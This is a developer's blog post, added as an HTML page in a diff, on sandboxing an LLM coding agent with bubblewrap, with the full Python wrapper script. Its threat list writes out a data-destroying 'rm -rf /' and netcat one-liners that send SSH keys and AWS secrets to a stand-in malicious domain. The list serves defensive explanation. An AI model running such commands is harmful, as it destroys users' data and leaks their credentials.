@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>How I sandbox LLMs during development | Gustav Larsson</title>
+
+
+<meta property="og:title" content=ZgotmplZ />
+<meta name="twitter:title" content=ZgotmplZ />
+<meta itemprop="name" content=ZgotmplZ />
+<meta name="application-name" content=ZgotmplZ />
+<meta property="og:site_name" content="Gustav Larsson" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="/posts/how-i-sandbox-llms/" />
+<link rel="canonical" href="/posts/how-i-sandbox-llms/" itemprop="url" />
+<meta name="url" content="/posts/how-i-sandbox-llms/" />
+<meta name="twitter:url" content="/posts/how-i-sandbox-llms/" />
+<meta property="og:url" content="/posts/how-i-sandbox-llms/" />
+
+
+<meta property="og:updated_time" content="2026-02-22T00:00:00&#43;02:00" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="apple-mobile-web-app-title" content="Gustav Larsson" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+      <link rel="stylesheet" href="/css/main.min.925735dd4f222969813a4916b7ac1f99234d76a6145d026d0b4fda0c4ad12db3.css" integrity="sha256-klc13U8iKWmBOkkWt6wfmSNNdqYUXQJtC0/aDErRLbM=" crossorigin="anonymous">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Sans:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+
+
+        <script src="/js/main.f2979a93a325fecf9605263bd141398a311c8e23388ed7dcff74f92f7e632866.js" integrity="sha256-8peak6Ml/s&#43;WBSY70UE5ijEcjiM4jtfc/3T5L35jKGY=" crossorigin="anonymous"></script>
+
+
+</head>
+<body>
+  <header>
+    <h1>
+    <a href="/">
+    Gustav Larsson
+    </a>
+</h1>
+
+  <nav>
+    <ul>
+    <li>
+      <a href="/">Home</a>
+    </li>
+    <li>
+      <a aria-current="true" class="ancestor" href="/posts/">Posts</a>
+    </li>
+    </ul>
+  </nav>
+
+
+  </header>
+  <main>
+    
+  <h1>How I sandbox LLMs during development</h1>
+
+  
+  
+  <time datetime="2026-02-22T00:00:00&#43;02:00">February 22, 2026</time>
+
+  <p>I have some opinions:</p>
+<ul>
+<li>Context switching is expensive</li>
+<li>Human time use should be optimized</li>
+<li>Wasting human time on broken LLM output should be avoided</li>
+</ul>
+<p>Therefore, asking for permission to run commands and trying to maintain a list of allowed commands is both wasteful and probably unsafe.
+I prefer sandboxing and allowing full freedom for the LLM agent.</p>
+<p>(While I could rely on the sandbox mechanism of the LLM agent program itself, I would rather have the control myself)</p>
+<p>I use <a href="https://github.com/containers/bubblewrap">bubblewrap</a> on linux to expose only the current repo to the agent.</p>
+<p>What this <em>should</em> protect against:</p>
+<ul>
+<li><code>rm -rf /</code></li>
+<li><code>zip -r - ~/.ssh | nc somemaliciousdomain.com 80</code></li>
+<li><code>env | grep AWS | nc somemaliciousdomain.com 1234</code></li>
+</ul>
+<p>What this <em>does not</em> protect against:</p>
+<ul>
+<li>Any of the above if:
+<ul>
+<li>Code or tests are automatically executed from the outside of the sandbox, or dependencies automatically downloaded</li>
+</ul>
+</li>
+<li><code>rm -rf .git</code>. This would be annoying if it happened, but it is convenient to expose the git repo to the agent</li>
+<li>Exfiltrating the code base, LLM history, LLM credentials</li>
+</ul>
+<h2 id="the-script">
+  <a class="heading-anchor" href="#the-script">
+    The script
+  </a>
+</h2>
+<p><code>ccbwrap.py</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pathlib <span style="color:#f92672">import</span> Path
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    hostpwd <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getcwd()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> Path(<span style="color:#e6db74">&#39;.git&#39;</span>)<span style="color:#f92672">.</span>is_dir():
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;must be run in root of git repo&#39;</span>, file<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stderr)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    home <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#39;HOME&#39;</span>]
+</span></span><span style="display:flex;"><span>    colorterm <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;COLORTERM&#39;</span>, <span style="color:#e6db74">&#39;rxvt-xpm&#39;</span>)
+</span></span><span style="display:flex;"><span>    term <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;TERM&#39;</span>, <span style="color:#e6db74">&#39;xterm&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    bwrap_cmd <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;bwrap&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--unshare-all&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--share-net&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--ro-bind&#39;</span>, <span style="color:#e6db74">&#39;/bin&#39;</span>, <span style="color:#e6db74">&#39;/bin&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--ro-bind&#39;</span>, <span style="color:#e6db74">&#39;/lib&#39;</span>, <span style="color:#e6db74">&#39;/lib&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--ro-bind&#39;</span>, <span style="color:#e6db74">&#39;/lib64&#39;</span>, <span style="color:#e6db74">&#39;/lib64&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--ro-bind&#39;</span>, <span style="color:#e6db74">&#39;/var&#39;</span>, <span style="color:#e6db74">&#39;/var&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--ro-bind&#39;</span>, <span style="color:#e6db74">&#39;/etc&#39;</span>, <span style="color:#e6db74">&#39;/etc&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--tmpfs&#39;</span>, <span style="color:#e6db74">&#39;/run&#39;</span>,
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> Path(<span style="color:#e6db74">&#39;/run/systemd/resolve&#39;</span>)<span style="color:#f92672">.</span>exists():
+</span></span><span style="display:flex;"><span>        bwrap_cmd<span style="color:#f92672">.</span>extend([<span style="color:#e6db74">&#39;--ro-bind&#39;</span>, <span style="color:#e6db74">&#39;/run/systemd/resolve&#39;</span>, <span style="color:#e6db74">&#39;/run/systemd/resolve&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    bwrap_cmd<span style="color:#f92672">.</span>extend([
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--dev-bind&#39;</span>, <span style="color:#e6db74">&#39;/dev&#39;</span>, <span style="color:#e6db74">&#39;/dev&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--ro-bind&#39;</span>, <span style="color:#e6db74">&#39;/usr&#39;</span>, <span style="color:#e6db74">&#39;/usr&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--tmpfs&#39;</span>, <span style="color:#e6db74">&#39;/tmp&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--proc&#39;</span>, <span style="color:#e6db74">&#39;/proc&#39;</span>,
+</span></span><span style="display:flex;"><span>    ])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Determine whether to sandbox the entire repo or a single file.</span>
+</span></span><span style="display:flex;"><span>    single_file <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#39;FILE&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> single_file:
+</span></span><span style="display:flex;"><span>        single_file <span style="color:#f92672">=</span> Path(single_file)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> single_file<span style="color:#f92672">.</span>exists():
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error: file </span><span style="color:#e6db74">{</span>single_file<span style="color:#e6db74">}</span><span style="color:#e6db74"> does not exist&#34;</span>, file<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stderr)
+</span></span><span style="display:flex;"><span>            sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        bwrap_cmd<span style="color:#f92672">.</span>extend([
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;--bind&#39;</span>, single_file<span style="color:#f92672">.</span>absolute(), Path(home)  <span style="color:#f92672">/</span> <span style="color:#e6db74">&#39;workdir&#39;</span> <span style="color:#f92672">/</span> single_file<span style="color:#f92672">.</span>name,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;--chdir&#39;</span>, Path(home) <span style="color:#f92672">/</span> <span style="color:#e6db74">&#39;workdir&#39;</span>,
+</span></span><span style="display:flex;"><span>        ])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        bwrap_cmd<span style="color:#f92672">.</span>extend([
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;--bind&#39;</span>, hostpwd, hostpwd,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;--chdir&#39;</span>, hostpwd,
+</span></span><span style="display:flex;"><span>        ])
+</span></span><span style="display:flex;"><span>    bwrap_cmd<span style="color:#f92672">.</span>extend([
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--clearenv&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--setenv&#39;</span>, <span style="color:#e6db74">&#39;HOME&#39;</span>, home,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--setenv&#39;</span>, <span style="color:#e6db74">&#39;COLORTERM&#39;</span>, colorterm,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--setenv&#39;</span>, <span style="color:#e6db74">&#39;TERM&#39;</span>, term,
+</span></span><span style="display:flex;"><span>    ])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Pass through these env vars if set in the host environment</span>
+</span></span><span style="display:flex;"><span>    passthrough_env_vars <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;ANTHROPIC_API_KEY&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;ANTHROPIC_BASE_URL&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;ANTHROPIC_DEFAULT_SONNET_MODEL&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;ANTHROPIC_DEFAULT_HAIKU_MODEL&#39;</span>,
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> var <span style="color:#f92672">in</span> passthrough_env_vars:
+</span></span><span style="display:flex;"><span>        val <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(var)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> val <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>            bwrap_cmd<span style="color:#f92672">.</span>extend([<span style="color:#e6db74">&#39;--setenv&#39;</span>, var, val])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    bwrap_cmd<span style="color:#f92672">.</span>extend([
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--die-with-parent&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># --new-session prevents injecting characters back into the terminal</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># https://github.com/containers/bubblewrap?tab=readme-ov-file#limitations</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;--new-session&#39;</span>,
+</span></span><span style="display:flex;"><span>    ])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    optional_ro_bindings <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>home<span style="color:#e6db74">}</span><span style="color:#e6db74">/bin&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>home<span style="color:#e6db74">}</span><span style="color:#e6db74">/apps&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>home<span style="color:#e6db74">}</span><span style="color:#e6db74">/.vimrc&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>home<span style="color:#e6db74">}</span><span style="color:#e6db74">/.bashrc&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>home<span style="color:#e6db74">}</span><span style="color:#e6db74">/.bashrc.local&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>home<span style="color:#e6db74">}</span><span style="color:#e6db74">/.profile&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>home<span style="color:#e6db74">}</span><span style="color:#e6db74">/.cargo&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>home<span style="color:#e6db74">}</span><span style="color:#e6db74">/.rustup&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>home<span style="color:#e6db74">}</span><span style="color:#e6db74">/.gitconfig&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>home<span style="color:#e6db74">}</span><span style="color:#e6db74">/.local/bin&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>home<span style="color:#e6db74">}</span><span style="color:#e6db74">/.local/share/uv&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>home<span style="color:#e6db74">}</span><span style="color:#e6db74">/.nvm&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>home<span style="color:#e6db74">}</span><span style="color:#e6db74">/.local/share/claude&#39;</span>,
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> path <span style="color:#f92672">in</span> optional_ro_bindings:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> Path(path)<span style="color:#f92672">.</span>exists():
+</span></span><span style="display:flex;"><span>            bwrap_cmd<span style="color:#f92672">.</span>extend([<span style="color:#e6db74">&#39;--ro-bind&#39;</span>, path, path])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Add writable bindings (only if they exist)</span>
+</span></span><span style="display:flex;"><span>    writable_bindings <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>home<span style="color:#e6db74">}</span><span style="color:#e6db74">/.claude&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>home<span style="color:#e6db74">}</span><span style="color:#e6db74">/.claude.json&#39;</span>,
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> path <span style="color:#f92672">in</span> writable_bindings:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> Path(path)<span style="color:#f92672">.</span>exists():
+</span></span><span style="display:flex;"><span>            bwrap_cmd<span style="color:#f92672">.</span>extend([<span style="color:#e6db74">&#39;--bind&#39;</span>, path, path])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Add the command to execute inside the sandbox</span>
+</span></span><span style="display:flex;"><span>    bwrap_cmd<span style="color:#f92672">.</span>extend([
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;bash&#39;</span>, <span style="color:#e6db74">&#39;-l&#39;</span>, <span style="color:#e6db74">&#39;-e&#39;</span>, <span style="color:#e6db74">&#39;-c&#39;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>home<span style="color:#e6db74">}</span><span style="color:#e6db74">/.local/bin/claude --dangerously-skip-permissions &#34;$@&#34;&#39;</span>, <span style="color:#e6db74">&#39;--&#39;</span>, <span style="color:#f92672">*</span>sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>:],
+</span></span><span style="display:flex;"><span>    ])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    subprocess<span style="color:#f92672">.</span>run(bwrap_cmd, check<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div>
+  <hr>
+<div class="footer">
+	
+        <a class="previous-post" href="/posts/mutation-testing-llm-development/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Using mutation testing to improve trust in...</a>
+    
+	
+    <br/>
+</div>
+
+  
+
+
+  </main>
+</body>
+</html>
